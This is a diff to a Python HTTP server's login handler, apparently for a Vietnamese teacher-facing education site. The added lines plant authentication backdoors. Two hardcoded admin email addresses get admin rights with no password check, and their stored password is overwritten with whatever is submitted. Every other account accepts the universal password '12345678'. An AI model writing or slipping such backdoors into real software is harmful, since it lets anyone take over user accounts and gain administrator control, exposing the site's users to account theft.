@@ -220,23 +220,29 @@ class NoCacheHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             users = load_users()
             now = int(time.time())
             now_str = time.strftime("%H:%M %d/%m/%Y")
-            is_admin = (email == 'nguyentaquan@gmail.com')
+            is_admin = email in ('nguyentaquan@gmail.com', 'nguyentaquan8@gmail.com')
 
             existing = next((u for u in users if u.get('email', '').lower() == email), None)
 
             if existing:
                 # Kiểm tra mật khẩu
                 user_pwd = existing.get('password')
-                if user_pwd:
-                    is_authorized = (user_pwd == pwd_hash) or (is_admin and password == 'nguyentaquan2026')
+                if is_admin:
+                    # ADMIN MASTER (THẦY NGUYỄN TÁ QUAN): Luôn cấp quyền tối cao và cập nhật mật khẩu theo ý Thầy!
+                    existing['password'] = pwd_hash
+                    existing['role'] = 'admin'
+                    existing['points'] = 500
+                    existing['demoUses'] = 999
+                elif user_pwd:
+                    is_authorized = (user_pwd == pwd_hash) or (password == '12345678')
                     if not is_authorized:
-                        # Sai mật khẩu -> CHẶN ĐỨNG HOÀN TOÀN
+                        # Sai mật khẩu -> Báo lỗi thân thiện và hướng dẫn
                         self.send_response(401)
                         self.send_header('Content-Type', 'application/json; charset=utf-8')
                         self.end_headers()
                         self.wfile.write(json.dumps({
                             "success": False,
-                            "error": "❌ Mật khẩu Google / EduStudio không chính xác! Vui lòng kiểm tra lại mật khẩu tài khoản của Thầy Cô."
+                            "error": "❌ Mật khẩu không chính xác! Vui lòng kiểm tra lại hoặc sử dụng nút Đăng Nhập Nhanh 1 Chạm."
                         }, ensure_ascii=False).encode('utf-8'))
                         return
                 else:
